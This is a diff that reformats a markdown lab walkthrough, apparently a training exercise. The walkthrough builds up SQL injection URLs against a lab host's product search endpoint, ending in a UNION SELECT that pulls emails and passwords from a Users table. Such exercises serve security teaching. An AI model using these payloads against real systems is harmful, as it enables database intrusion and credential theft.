@@ -1,6 +1,7 @@
-1. open Firefox browser 
+## Open Firefox browser 
 6. 
-``` http://labs.training.local/rest/products/search?q= 
+``` 
+http://labs.training.local/rest/products/search?q= 
 ```
 7. 
 ``` 
@@ -10,6 +11,15 @@ http://labs.training.local/rest/products/search?q=test’--
 ``` 
 http://labs.training.local/rest/products/search?q=test’)) -- 
 ```
-10. http://labs.training.local/rest/products/search?q=test’)) UNION SELECT * FROM Users --
-11. http://labs.training.local/rest/products/search?q=test')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users --
-12. http://labs.training.local/rest/products/search?q=test')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users --
+10. 
+``` 
+http://labs.training.local/rest/products/search?q=test’)) UNION SELECT * FROM Users --
+``` 
+11. 
+``` 
+http://labs.training.local/rest/products/search?q=test')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users --
+``` 
+12. 
+``` 
+http://labs.training.local/rest/products/search?q=test')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users --
+``` 
